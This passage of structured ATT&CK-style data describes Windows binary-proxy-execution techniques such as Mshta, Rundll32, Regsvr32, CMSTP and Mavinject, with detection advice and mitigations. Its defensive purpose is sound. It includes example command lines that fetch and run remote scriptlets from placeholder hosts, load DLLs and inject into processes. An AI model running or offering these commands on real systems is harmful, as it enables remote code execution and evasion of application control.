are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Controls Folder\\{name}\\Shellex\\PropertySheetHandlers</code> where {name} is the predefined name of the system item. <a href=\"https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Implementing CPL)</a>\n\nAnalyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques. <a href=\"https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro CPL Malware Jan 2014)</a>","platforms":["Windows"],"dataSources":["File: File Creation","Module: Module Load","Windows Registry: Windows Registry Key Modification","Command: Command Execution","Process: OS API Execution","Process: Process Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict storage and execution of Control Panel items to protected directories, such as <code>C:\\Windows</code>, rather than user directories."},{"id":"M1038","name":"Execution Prevention","description":"Identify and block potentially malicious and unknown .cpl files by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools, like Windows Defender Application Control <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a>, AppLocker, <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> or Software Restriction Policies <a href=\"http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corio 2008)</a> where appropriate. <a href=\"https://technet.microsoft.com/en-us/library/ee791851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Applocker vs SRP)</a>"}]},{"id":"T1218.003","name":"CMSTP","description":"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. <a href=\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Connection Manager Oct 2009)</a> CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. <a href=\"https://x.com/ItsReallyNick/status/958789644165894146\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter CMSTP Usage Jan 2018)</a> Similar to Regsvr32 / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs <a href=\"https://msitpros.com/?p=3960\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSitPros CMSTP Aug 2017)</a>  and/or COM scriptlets (SCT) from remote servers. <a href=\"https://x.com/NickTyrer/status/958450014111633408\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter CMSTP Jan 2018)</a> <a href=\"https://github.com/api0cradle/UltimateAppLockerByPassList\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Ultimate AppLocker Bypass List)</a> <a href=\"http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Endurant CMSTP July 2018)</a> This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. <a href=\"https://msitpros.com/?p=3960\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSitPros CMSTP Aug 2017)</a> <a href=\"https://github.com/api0cradle/UltimateAppLockerByPassList\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Ultimate AppLocker Bypass List)</a> <a href=\"http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Endurant CMSTP July 2018)</a>","detection":"Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.\n\nSysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: <a href=\"http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Endurant CMSTP July 2018)</a>\n\n* To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.\n* To detect Bypass User Account Control via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).","platforms":["Windows"],"dataSources":["Network Traffic: Network Connection Creation","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Consider using application control configured to block execution of CMSTP.exe if it is not required for a given system or network to prevent potential misuse by adversaries."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"CMSTP.exe may not be necessary within a given environment (unless using it for VPN connection installation)."}]},{"id":"T1218.004","name":"InstallUtil","description":"Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. <a href=\"https://msdn.microsoft.com/en-us/library/50614e95.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN InstallUtil)</a> The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v&lt;version&gt;\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v&lt;version&gt;\\InstallUtil.exe</code>.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Installutil/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Installutil)</a>","detection":"Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control configured to block execution of InstallUtil.exe if it is not required for a given system or network to prevent potential misuse by adversaries."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"InstallUtil may not be necessary within a given environment."}]},{"id":"T1218.005","name":"Mshta","description":"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code <a href=\"https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Dust Storm)</a> <a href=\"https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary HTA Abuse Part Deux)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Attacks Leveraging HTA)</a> <a href=\"https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Airbus Security Kovter Analysis)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye FIN7 April 2017)</a> \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. <a href=\"https://en.wikipedia.org/wiki/HTML_Application\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia HTML Application)</a> HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. <a href=\"https://msdn.microsoft.com/library/ms536471.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN HTML Applications)</a>\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Mshta/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Mshta)</a>","detection":"Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious","platforms":["Windows"],"dataSources":["Process: Process Creation","File: File Creation","Command: Command Execution","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control configured to block execution of <code>mshta.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>mshta.exe</code> application and to prevent abuse. <a href=\"https://docs.microsoft.com/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WDAC)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life."}]},{"id":"T1218.007","name":"Msiexec","description":"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft msiexec)</a> The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Msiexec/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Msiexec)</a> <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro Msiexec Feb 2018)</a> Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled. <a href=\"https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AlwaysInstallElevated 2018)</a>","detection":"Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.","platforms":["Windows"],"dataSources":["Module: Module Load","Network Traffic: Network Connection Creation","Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict execution of Msiexec.exe to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling the <code>AlwaysInstallElevated</code> policy to prevent elevated execution of Windows Installer packages. <a href=\"https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AlwaysInstallElevated 2018)</a>"}]},{"id":"T1218.008","name":"Odbcconf","description":"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. <a href=\"https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft odbcconf.exe)</a> The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &amp;lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&amp;rbrace;</code>). <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Odbcconf)</a> <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro Squiblydoo Aug 2017)</a> <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro Cobalt Group Nov 2017)</a>","detection":"Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Module: Module Load"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control configured to block execution of Odbcconf.exe if it is not required for a given system or network to prevent potential misuse by adversaries."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Odbcconf.exe may not be necessary within a given environment."}]},{"id":"T1218.009","name":"Regsvcs/Regasm","description":"Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. <a href=\"https://msdn.microsoft.com/en-us/library/04za0hca.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN Regsvcs)</a> <a href=\"https://msdn.microsoft.com/en-us/library/tzat5yw6.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN Regasm)</a>\n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Regsvcs)</a> <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Regasm/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Regasm)</a>","detection":"Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Block execution of Regsvcs.exe and Regasm.exe if they are not required for a given system or network to prevent potential misuse by adversaries."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Regsvcs and Regasm may not be necessary within a given environment."}]},{"id":"T1218.010","name":"Regsvr32","description":"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. <a href=\"https://support.microsoft.com/en-us/kb/249873\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Regsvr32)</a>\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Regsvr32)</a> This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. <a href=\"https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Carbon Black Squiblydoo Apr 2016)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Regsvr32 Targeting Mongolian Gov)</a>\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking. <a href=\"https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Carbon Black Squiblydoo Apr 2016)</a>","detection":"Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. <a href=\"https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Carbon Black Squiblydoo Apr 2016)</a>","platforms":["Windows"],"dataSources":["Module: Module Load","Command: Command Execution","Network Traffic: Network Connection Creation","Process: Process Creation"],"mitigations":[{"id":"M1050","name":"Exploit Protection","description":"Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass application control. <a href=\"https://github.com/iadgov/Secure-Host-Baseline/tree/master/EMET\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secure Host Baseline EMET)</a> Identify and block potentially malicious software executed through regsvr32 functionality by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools, like Windows Defender Application Control <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a>, AppLocker, <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> or Software Restriction Policies <a href=\"http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corio 2008)</a> where appropriate. <a href=\"https://technet.microsoft.com/en-us/library/ee791851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Applocker vs SRP)</a>"}]},{"id":"T1218.011","name":"Rundll32","description":"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. <a href=\"https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro CPL)</a> For example, ClickOnce can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. <a href=\"https://www.stormshield.com/news/poweliks-command-line-confusion/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: This is Security Command Line Confusion)</a>\n\nThreat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection. <a href=\"https://lolbas-project.github.io/lolbas/Libraries/Zipfldr/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: lolbas project Zipfldr.dll)</a> <a href=\"https://lolbas-project.github.io/lolbas/Libraries/Ieframe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: lolbas project Ieframe.dll)</a>\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. <a href=\"https://www.attackify.com/blog/rundll32_execution_order/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Attackify Rundll32.exe Obscurity)</a> <a href=\"https://github.com/gtworek/PSBits/tree/master/NoRunDll\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github NoRunDll)</a> DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. <a href=\"https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: rundll32.exe defense evasion)</a>","detection":"Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","File: File Metadata","Module: Module Load"],"mitigations":[{"id":"M1050","name":"Exploit Protection","description":"Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass application control."}]},{"id":"T1218.012","name":"Verclsid","description":"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell. <a href=\"https://www.winosbite.com/verclsid-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WinOSBite verclsid.exe)</a>\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Verclsid/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Verclsid)</a> <a href=\"https://redcanary.com/blog/verclsid-exe-threat-detection/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary Verclsid.exe)</a> <a href=\"https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BOHOPS Abusing the COM Registry)</a> <a href=\"https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nick Tyrer GitHub)</a>","detection":"Use process monitoring to monitor the execution and arguments of verclsid.exe. Compare recent invocations of verclsid.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of verclsid.exe may also be useful in determining the origin and purpose of the payload being executed. Depending on the environment, it may be unusual for verclsid.exe to have a parent process of a Microsoft Office product. It may also be unusual for verclsid.exe to have any child processes or to make network connections or file modifications.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"Consider modifying host firewall rules to prevent egress traffic from verclsid.exe."},{"id":"M1038","name":"Execution Prevention","description":"Use application control configured to block execution of verclsid.exe if it is not required for a given system or network to prevent potential misuse by adversaries."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider removing verclsid.exe if it is not necessary within a given environment."}]},{"id":"T1218.013","name":"Mavinject","description":"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V). <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Mavinject/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Mavinject)</a>\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>). <a href=\"https://cybersecurity.att.com/blogs/labs-research/lazarus-campaign-ttps-and-evolution\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT Lazarus TTP Evolution)</a> <a href=\"https://reaqta.com/2017/12/mavinject-microsoft-injector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Reaqta Mavinject)</a> Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to Dynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address. <a href=\"https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mavinject Functionality Deconstructed)</a>","detection":"Monitor the execution and arguments of mavinject.exe. Compare recent invocations of mavinject.exe with prior history of known good arguments and injected DLLs to determine anomalous and potentially adversarial activity.\n\nAdversaries may rename abusable binaries to evade detections, but the argument <code>INJECTRUNNING</code> is required for mavinject.exe to perform Dynamic-link Library Injection and may therefore be monitored to alert malicious activity.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control configured to block execution of mavinject.exe if it is not required for a given system or network to prevent potential misuse by adversaries."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider removing mavinject.exe if Microsoft App-V is not used within a given environment."}]},{"id":"T1218.014","name":"MMC","description":"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. <a 